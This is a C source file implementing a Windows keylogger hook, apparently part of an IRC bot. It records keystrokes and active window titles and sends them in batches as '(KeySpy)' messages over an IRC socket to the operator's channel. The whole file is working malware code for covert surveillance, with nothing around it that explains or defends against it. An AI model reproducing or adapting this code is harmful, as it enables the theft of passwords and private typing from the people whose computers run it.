#include "includes.h"
#include "functions.h"

LRESULT CALLBACK JournalLogProc(int code, WPARAM wParam, LPARAM lParam)
{
	char buffer[512];

	if(code<0) return CallNextHookEx(keyhook,code,wParam,lParam);
	if(code==HC_ACTION) {
		EVENTMSG *pEvt=(EVENTMSG *)lParam;
		if(pEvt->message==WM_KEYDOWN) {
			DWORD dwCount,dwBytes;
			char svBuffer[256];
			int vKey,nScan;
		
			vKey=LOBYTE(pEvt->paramL);
			nScan=HIBYTE(pEvt->paramL);
			nScan<<=16;
			HWND hFocus=GetActiveWindow();
			if(hLastFocus!=hFocus) {
				char svTitle[256];
				int nCount;
				nCount=GetWindowText(hFocus,svTitle,256);
				if(nCount>0) {
					if (lstrlen(svTitle) > 32)
					{
						svTitle[32]=0;
						strcat(svTitle, "...");
					}
					char svBuffer[512];
					wsprintf(svBuffer,"(%s) ",svTitle);
					strcat(KeyBuffer, svBuffer);
					if(lstrlen(KeyBuffer)>150)
					{
						wsprintf(buffer, "PRIVMSG %s :\3%d(KeySpy) %s\r\n",channel,KeyClr,KeyBuffer);
						send(sock, buffer, lstrlen(buffer), 0);
						strcpy(KeyBuffer, "");
					}
				}
				hLastFocus=hFocus;
			}
			dwCount=GetKeyNameText(nScan,svBuffer,256);	
			if(dwCount) {
				if(vKey==VK_SPACE) {
					svBuffer[0]=' ';
					svBuffer[1]='\0';
					dwCount=1;
				}
				if(dwCount==1) {
					BYTE kbuf[256];
					WORD ch;
					int chcount;
					
					GetKeyboardState(kbuf);					
					chcount=ToAscii(vKey,nScan,kbuf,&ch,0);
					if(chcount>0) 
					{
						if (ch < 32) return 0;
						strncat(KeyBuffer,(char *)&ch,1);		
					}
					if(lstrlen(KeyBuffer)>150)
					{
						wsprintf(buffer, "PRIVMSG %s :\3%d(KeySpy) %s\r\n",channel,KeyClr,KeyBuffer);
						send(sock, buffer, lstrlen(buffer), 0);
						strcpy(KeyBuffer, "");
					}
				} else {
					//seing tons of [Backspace] and shit got annoying, so only process a few important keys..

					//strcat(KeyBuffer,"[");
					//strcat(KeyBuffer,svBuffer);
					if (lstrcmp(svBuffer,"Backspace") == 0)
					{
						KeyBuffer[lstrlen(KeyBuffer)-1] = 0;
					}
					if (lstrcmp(svBuffer,"Enter") == 0)
					{
						wsprintf(buffer, "PRIVMSG %s :\3%d(KeySpy) %s\r\n",channel,KeyClr,KeyBuffer);
						send(sock, buffer, lstrlen(buffer), 0);
						strcpy(KeyBuffer,"");
					}
					//strcat(KeyBuffer,"]");
					//if(lstrlen(KeyBuffer)>150)
					//{
					//	wsprintf(buffer, "PRIVMSG %s :(KeySpy) %s\r\n",channel,KeyBuffer);
					//	send(sock, buffer, lstrlen(buffer), 0);
					//	strcpy(KeyBuffer, "");
					//}
				}
			}			
		}
	
	}
	return CallNextHookEx(keyhook,code,wParam,lParam);
}
